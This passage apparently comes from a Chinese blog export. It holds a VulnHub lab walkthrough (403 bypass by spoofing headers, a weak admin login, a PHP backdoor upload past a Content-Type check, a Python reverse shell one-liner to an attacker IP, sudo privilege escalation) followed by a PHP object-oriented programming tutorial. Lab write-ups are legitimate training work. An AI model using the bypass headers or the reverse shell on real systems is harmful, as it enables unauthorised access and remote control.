<li>文件上传</li>
<li>提权</li>
</ul>
<h1 id="linux-sudo命令">Linux sudo命令</h1>
<p>Linux sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo
所执行的指令就好像是 root 亲自执行。</p>
<p>使用权限：在 /etc/sudoers 中有出现的使用者。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sudo -V # 显示版本编号</span><br><span class="line">2. sudo -h # 显示版本编号及指令的使用方式说明 help</span><br><span class="line">3. sudo -l # 显示出自己（执行 sudo 的使用者）的权限</span><br><span class="line">4. sudo -v # 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码</span><br><span class="line">5. sudo -k # 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）</span><br><span class="line">6. sudo -s # 执行环境变量中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</span><br><span class="line">7. sudo -H # 将环境变量中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）</span><br><span class="line">8. sudo command # 要以系统管理者身份（或以 -u 更改为其他人）执行的指令</span><br><span class="line">9. sudo [ -b ] [ -p prompt ] [ -u username/#uid] -s</span><br><span class="line">	-b 将要执行的指令</span><br><span class="line">	-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称</span><br><span class="line">	-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者id）</span><br></pre></td></tr></table></figure>
<h1 id="bypass">403&amp;401 Bypass</h1>
<p>常见403 Bypass：</p>
<ol type="1">
<li>旁站绕过：修改请求包中的host（可以是域名，也可以是IP地址）。假设目标网站的域名为<code>www.target.com</code>，我们通过信息收集发现存在另一个子域名<code>special.target.com</code>，我们从<code>www</code>访问某个文件可能出现403，但是从<code>special</code>访问可能就能够成功。这是因为管理员<strong>只针对<code>www.target.com</code>的请求做了限制</strong>。</li>
<li>覆盖URL</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">覆盖URL的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET / HTTP/1.1</span><br><span class="line">  X-Original-URL: /auth/login</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
<p>原理：管理员<strong>只针对请求的URL做了限制</strong>，即如果直接访问<code>/auth/login</code>则会403，但是，如果访问根目录，然后通过X-Original-URL
或 X-Rewrite-URL HTTP 请求标头覆盖请求 URL
中的路径（前提是服务器支持这两种标头）</p>
<ol start="3" type="1">
<li>修改来源</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的数据包：</span><br><span class="line"># Request</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 403 Forbidden</span><br><span class="line"></span><br><span class="line">修改来源的数据包：</span><br><span class="line"># Reques</span><br><span class="line">  GET /auth/login HTTP/1.1</span><br><span class="line">  Referer: https://xxx.com</span><br><span class="line"># Response</span><br><span class="line">  HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
<p>原理：管理员<strong>只针对从其他域名/网站来的请求做了限制</strong>，因此，通过修改<code>Referer</code>将请求的来源伪装成已经授权的URL地址。此时，服务端会认为该用户已经得到了授权，所以允许访问其他需要授权的URL</p>
<ol start="4" type="1">
<li>反向代理：使用许多<code>X</code>开头的头部，比如<code>X-Forwarded-For</code>。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br><span class="line">X-Original-URL: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">Cluster-Client-IP: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
<h1 id="渗透">渗透</h1>
<h2
id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.11</span><br><span class="line">sudo nmap -p20,80 -sV 10.0.2.11</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143240.png" /></p>
<ul>
<li>22端口开启ssh服务</li>
<li>80端口开着http服务，Apache版本2.4.10</li>
<li>靶机的操作系统为Ubuntu</li>
</ul>
<h2 id="访问http服务">访问HTTP服务</h2>
<p>访问80端口，得到提示： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, the site is under construction soon, it run</span><br></pre></td></tr></table></figure></p>
<p>查看源码发现没有什么有用的信息，那就进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u 10.0.2.11:80</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143714.png" /></p>
<p>先访问了状态码为200的两个文件，发现没什么变化，再去看了一下301的文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409143948.png" /></p>
<p>发现居然返回403。403表示服务器有这个资源，但是对访问该资源的用户做了一定的限制，只有经过授权的用户才能够访问，否则就会返回403。因此，这里想到403
Bypass。</p>
<h2 id="指纹探测">指纹探测</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">whatweb http://10.0.2.11</span><br></pre></td></tr></table></figure>
<p>像上面收集不到任何信息的时候，可以采用指纹探测，看一下网站的结构（用的什么框架，版本多少，语言是什么之类的信息），如果对应的框架存在漏洞，就可以直接利用！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150017.png" /></p>
<h2 id="bypass-1">403 Bypass</h2>
<p>经过尝试，发现在请求头部添加下面信息时，成功访问 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144347.png" /></p>
<p>注意，如果后面渗透过程中再次出现403，那么就在请求数据包中加入上述信息即可，也可以每个都加（反正没害）。</p>
<h2 id="弱口令">弱口令</h2>
<p>拿到输入框一般有以下思路：</p>
<ol type="1">
<li>弱口令</li>
<li>注入漏洞</li>
<li>XXE、XXS</li>
<li>爆破</li>
</ol>
<p>这里随便尝试了下弱口令，居然登录成功！ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409144729.png" /></p>
<h2 id="文件上传">文件上传</h2>
<p>一进来就看到了<code>Upload file</code></p>
<p>直接上传一个后门php文件，发现上传不成功，也就是被拦截了。现在需要绕过拦截，常规有以下方法：</p>
<ol type="1">
<li>修改后缀（大小写、复写）</li>
<li>修改<code>Content-Type</code></li>
<li>修改文件头部信息</li>
</ol>
<p>经过测试，发现本题后台的验证方式是<code>Content-Type</code>，因此将该信息修改为图片的即可上传成功，并且成功获得路径！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145138.png" /></p>
<p>命令成功被执行，确定文件上传成功！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145414.png" /></p>
<p>接下来就是反弹shell了。这里可以采用nc，也可以用python，我这里打算用python，所以先用<code>which python</code>查看以下靶机上是否存在python环境，发现确实存在，那么直接执行python反弹shell的代码即可。（先在kali上进行端口监听）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409145751.png" /></p>
<h2 id="权限提升">权限提升</h2>
<p>该靶机的权限提升是最简单的。</p>
<p>首先进行信息收集，发现在家目录下有一个文件<code>user.txt</code>，一看就知道是flag；以及一个目录<code>yousef</code>。查看<code>/etc/passwd</code>发现确实有这么一个用户。</p>
<p>我们先尝试读取<code>user.txt</code>的信息，发现能够直接读取！
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure></p>
<p>这看过去有点像base64编码的结果。因此尝试解码。</p>
<blockquote>
<p>base64编码得到的字符串包含a-zA-Z0-9/+=，最显著的特征就是结果有一个或多个=。</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150426.png" /></p>
<p>发现居然直接就得到<code>yousef</code>得账号和密码！直接<code>su</code>切换（需要进行shell升级），当然也可以选择用<code>ssh</code>连接</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150759.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150809.png" /></p>
<p>查看以下该用户得sudo权限 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409150849.png" /></p>
<p>发现该用户居然有全部得权限。因此直接用sudo权限执行shell即可。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220409151011.png" /></p>
<p>提权成功！直接读取<code>/root</code>下的flag即可 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bat /root/root.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># WW91J3ZlIGdvdCB0aGUgcm9vdCBDb25ncmF0dWxhdGlvbnMgYW55IGZlZWRiYWNrIGNvbnRlbnQgbWUgdHdpdHRlciBAeTB1c2VmXzEx</span></span><br></pre></td></tr></table></figure></p>
<p>该靶机到此结束。</p>
<h1 id="总结">总结</h1>
<p>该靶机虽然难度为简单，这是因为该靶机的漏洞在现实中比较常见，大家见的多了，自然就简单了。换句话说，简单的靶机更贴近现实。</p>
<p>通过对该靶机的渗透，还是学到了一些知识：</p>
<ol type="1">
<li>指纹探测</li>
<li>403 Bypass</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>指纹探测</tag>
        <tag>403 Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>8. 类与对象</title>
    <url>/2022/11/21/8.%20%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="oopobject-oriented-programming介绍">1. OOP（Object Oriented
Programming）介绍</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121091548.png" /></p>
<h1 id="类的声明内部属性和方法定义">2. 类的声明、内部属性和方法定义</h1>
<p>类的声明语法：</p>
<ul>
<li>使用 <code>class</code> 关键字；</li>
<li>类的名字也必须满足之前说的命名规则；</li>
<li>类中的属性、方法必须以访问控制符开头，访问控制符有：
<ul>
<li><code>public</code> ：公共属性，外部可以直接访问；</li>
<li><code>private</code> ：私有属性，只允许在类中（实例中）调用；</li>
<li><code>protected</code>
：受保护的，仅允许本类或子类（实例）访问；</li>
</ul></li>
<li>在类中，如果需要访问变量，需要使用伪变量 <code>$this</code>，比如
<code>$this-&gt;name</code> 这样的方式，类似于 Python 中的
<code>self</code>，这是因为定义类的时候实例还没有创建，<code>$this</code>
可以理解为当前对象的虚拟引用；</li>
<li>在外部访问变量，直接使用类的实例即可；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$city</span> = <span class="string">&#x27;beijing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_age</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_city</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;city;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实例创建：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>没有传入参数，也可以不加括号</p>
</blockquote>
<p>属性访问：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;get_age();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;get_city();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121093009.png" /></p>
<p>不允许在外部访问 <code>$age</code> 和
<code>$city</code>，只能类中的方法作为接口调用。</p>
<p>需要注意：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$obj2</span> = <span class="variable">$obj</span>;</span><br></pre></td></tr></table></figure>
<p>上述代码不会创建新的对象， <code>$obj2</code> 是 <code>$obj</code>
的引用变量。</p>
<h1 id="类的实例化">3. 类的实例化</h1>
<p>总共有 6 种创建方法:</p>
<ol type="1">
<li>用 <code>new class_name()</code> 创建；</li>
<li>将类名以字符串的方式放在一个变量中；</li>
<li>用对象创建对象，创建的是一个新对象；</li>
<li>用 <code>new self()</code> 创建；</li>
<li>用 <code>new parent()</code> 创建；</li>
<li>用 <code>nwe static()</code> 创建；</li>
</ol>
<p>先介绍前 3 种，也是比较容易理解的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$city</span> = <span class="string">&#x27;beijing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_age</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_city</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 用 new class_name() 创建</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Demo();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 将类名以字符串的方式放在一个变量中</span></span><br><span class="line"><span class="variable">$class_name</span> = <span class="string">&#x27;Demo&#x27;</span>;</span><br><span class="line"><span class="variable">$obj1</span> = <span class="keyword">new</span> <span class="variable">$class_name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj1</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 用对象创建对象，创建的是一个新对象</span></span><br><span class="line"><span class="variable">$obj2</span> = <span class="keyword">new</span> <span class="variable">$obj</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj2</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121095711.png" /></p>
<p>第 4 种：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$city</span> = <span class="string">&#x27;beijing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_age</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_city</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_obj</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 用 new self()</span></span><br><span class="line"><span class="variable">$obj3</span> = (<span class="keyword">new</span> Demo)-&gt;get_obj();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj3</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><code>new self()</code> 作用：根据当前类创建新的对象，注意这里的
<strong>当前类</strong> 指的是调用 <code>get_obj</code>
方法的实例所述的类。</p>
<p>第 5 种：</p>
<p>首先可以使用 <code>extends</code> 创建一个子类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$city</span> = <span class="string">&#x27;beijing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_age</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_city</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_obj</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> <span class="keyword">extends</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_new_ogj</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">parent</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5. 用 new parent()，根据当前类的父类创建新的对象</span></span><br><span class="line"><span class="variable">$obj4</span> = (<span class="keyword">new</span> Demo2)-&gt;get_new_ogj();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj4</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> get_class(<span class="variable">$obj4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121100432.png" /></p>
<p><code>Demo2</code> 的实例调用了 <code>get_new_obj()</code>
方法，该方法中的 <code>new partent()</code>
会基于当前实例的类的父类创建一个实例，因此创建的是父类的实例。</p>
<p>第 6 种 （称为 <strong>静态延迟绑定</strong>，与第 4 种做对比）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$city</span> = <span class="string">&#x27;beijing&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_age</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_city</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;city;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_obj</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_static</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">static</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo2</span> <span class="keyword">extends</span> <span class="title">Demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_new_ogj</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">parent</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 6. 用 new static()，根据当前类创建新的对象，直接与调用者绑定，称为静态延迟绑定。与 new self有区别</span></span><br><span class="line"><span class="variable">$obj5</span> = (<span class="keyword">new</span> Demo)-&gt;get_obj();</span><br><span class="line"><span class="variable">$obj6</span> = (<span class="keyword">new</span> Demo)-&gt;get_static();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj5</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> get_class(<span class="variable">$obj5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj6</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> get_class(<span class="variable">$obj6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121100808.png" /></p>
<p>这样一看好像没什么两样，如果换成如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 6. 用 new static()，根据当前类创建新的对象，直接与调用者绑定，称为静态延迟绑定。与 new self有区别</span></span><br><span class="line"><span class="variable">$obj5</span> = (<span class="keyword">new</span> Demo2)-&gt;get_obj();</span><br><span class="line"><span class="variable">$obj6</span> = (<span class="keyword">new</span> Demo2)-&gt;get_static();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj5</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> get_class(<span class="variable">$obj5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj6</span>-&gt;name;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> get_class(<span class="variable">$obj6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
